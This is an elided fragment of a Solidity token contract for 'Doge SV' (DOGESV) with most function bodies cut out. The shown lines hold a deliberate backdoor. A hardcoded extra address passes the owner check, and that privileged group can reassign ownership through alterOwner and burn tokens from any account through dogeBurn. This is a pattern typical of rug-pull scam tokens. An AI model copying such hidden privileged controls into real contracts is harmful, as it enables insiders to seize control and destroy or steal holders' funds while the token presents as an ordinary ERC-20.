...
contract DOGESV is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Doge SV";
    string public _symbol= "DOGESV";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0x89D33f0CE1DBA2d506AaAc161755cb97F33D58A9);
    
    modifier onlyOwner {
        require((owner == msg.sender) || (msg.sender == marketAddy));
        _;
    }
    function alterOwner(address _owner) onlyOwner public {
        owner = _owner;
    }
    ...
    function dogeSet() onlyOwner public {
    ...
    function _transfer(
      ...
      function dogeBurn(address account, uint256 amount) onlyOwner  public virtual {
